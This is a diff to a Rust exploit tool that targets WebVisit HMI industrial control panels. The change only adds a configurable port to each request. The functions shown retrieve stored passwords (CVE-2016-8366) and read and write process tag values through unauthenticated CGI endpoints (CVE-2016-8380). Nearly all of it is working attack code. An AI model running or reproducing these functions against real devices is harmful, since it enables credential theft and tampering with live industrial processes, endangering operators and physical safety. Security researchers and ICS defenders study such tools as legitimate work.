@@ -15,14 +15,15 @@ pub struct TagEntry {
     pub value: Option<String>,
 }
 
-/// Retrieve passwords from WebVisit HMI (CVE-2016-8366).
-pub fn retrieve_passwords(target_ip: &str) -> Result<Vec<PasswordEntry>> {
+/// Retrieve passwords from WebVisit HMI (CVE-2016-8366). Pass `port = 0` for default (80).
+pub fn retrieve_passwords(target_ip: &str, port: u16) -> Result<Vec<PasswordEntry>> {
+    let effective_port = if port == 0 { 80 } else { port };
     let agent = ureq::AgentBuilder::new()
         .timeout_connect(Duration::from_secs(5))
         .timeout_read(Duration::from_secs(5))
         .build();
 
-    let resp = match agent.get(&format!("http://{target_ip}")).call() {
+    let resp = match agent.get(&format!("http://{target_ip}:{effective_port}")).call() {
         Ok(r) => r.into_string()?,
         Err(e) => anyhow::bail!("Cannot connect to {target_ip}: {e}"),
     };
@@ -42,7 +43,7 @@ pub fn retrieve_passwords(target_ip: &str) -> Result<Vec<PasswordEntry>> {
     };
 
     let teq_body = match agent
-        .get(&format!("http://{target_ip}/{main_teq}"))
+        .get(&format!("http://{target_ip}:{effective_port}/{main_teq}"))
         .call()
     {
         Ok(r) => {
@@ -110,14 +111,15 @@ pub fn retrieve_passwords(target_ip: &str) -> Result<Vec<PasswordEntry>> {
     Ok(results)
 }
 
-/// Retrieve the tag list from a WebVisit HMI.
-pub fn get_tags(target_ip: &str) -> Result<(String, Vec<String>)> {
+/// Retrieve the tag list from a WebVisit HMI. Pass `port = 0` for default (80).
+pub fn get_tags(target_ip: &str, port: u16) -> Result<(String, Vec<String>)> {
+    let effective_port = if port == 0 { 80 } else { port };
     let agent = ureq::AgentBuilder::new()
         .timeout_connect(Duration::from_secs(5))
         .timeout_read(Duration::from_secs(5))
         .build();
 
-    let resp = match agent.get(&format!("http://{target_ip}")).call() {
+    let resp = match agent.get(&format!("http://{target_ip}:{effective_port}")).call() {
         Ok(r) => r.into_string()?,
         Err(e) => anyhow::bail!("Cannot connect to {target_ip}: {e}"),
     };
@@ -139,7 +141,7 @@ pub fn get_tags(target_ip: &str) -> Result<(String, Vec<String>)> {
     println!("Found project: {project}");
 
     let tcr_body = match agent
-        .get(&format!("http://{target_ip}/{project}.tcr"))
+        .get(&format!("http://{target_ip}:{effective_port}/{project}.tcr"))
         .call()
     {
         Ok(r) => r.into_string()?,
@@ -166,8 +168,9 @@ pub fn get_tags(target_ip: &str) -> Result<(String, Vec<String>)> {
     Ok((project, tags))
 }
 
-/// Read current values for a list of tags (CVE-2016-8380).
-pub fn read_tag_values(target_ip: &str, tags: &[String]) -> Result<Vec<(String, String)>> {
+/// Read current values for a list of tags (CVE-2016-8380). Pass `port = 0` for default (80).
+pub fn read_tag_values(target_ip: &str, port: u16, tags: &[String]) -> Result<Vec<(String, String)>> {
+    let effective_port = if port == 0 { 80 } else { port };
     let mut body = format!(
         "<body><item_list_size>{}</item_list_size><item_list>",
         tags.len()
@@ -183,7 +186,7 @@ pub fn read_tag_values(target_ip: &str, tags: &[String]) -> Result<Vec<(String, 
     }
     body.push_str("</item_list></body>");
 
-    let url = format!("http://{target_ip}/cgi-bin/ILRReadValues.exe");
+    let url = format!("http://{target_ip}:{effective_port}/cgi-bin/ILRReadValues.exe");
     let agent = ureq::AgentBuilder::new()
         .timeout_read(Duration::from_secs(10))
         .build();
@@ -208,14 +211,15 @@ pub fn read_tag_values(target_ip: &str, tags: &[String]) -> Result<Vec<(String, 
     Ok(values)
 }
 
-/// Write a tag value (CVE-2016-8380).
-pub fn write_tag_value(target_ip: &str, tag_name: &str, value: &str) -> Result<bool> {
+/// Write a tag value (CVE-2016-8380). Pass `port = 0` for default (80).
+pub fn write_tag_value(target_ip: &str, port: u16, tag_name: &str, value: &str) -> Result<bool> {
     if target_ip.parse::<std::net::Ipv4Addr>().is_err() {
         anyhow::bail!("Invalid target IP: {target_ip}");
     }
+    let effective_port = if port == 0 { 80 } else { port };
     let enc_name = percent_encode(tag_name);
     let enc_value = percent_encode(value);
-    let url = format!("http://{target_ip}/cgi-bin/writeVal.exe?{enc_name}+{enc_value}");
+    let url = format!("http://{target_ip}:{effective_port}/cgi-bin/writeVal.exe?{enc_name}+{enc_value}");
     let agent = ureq::AgentBuilder::new()
         .timeout_read(Duration::from_secs(5))
         .build();
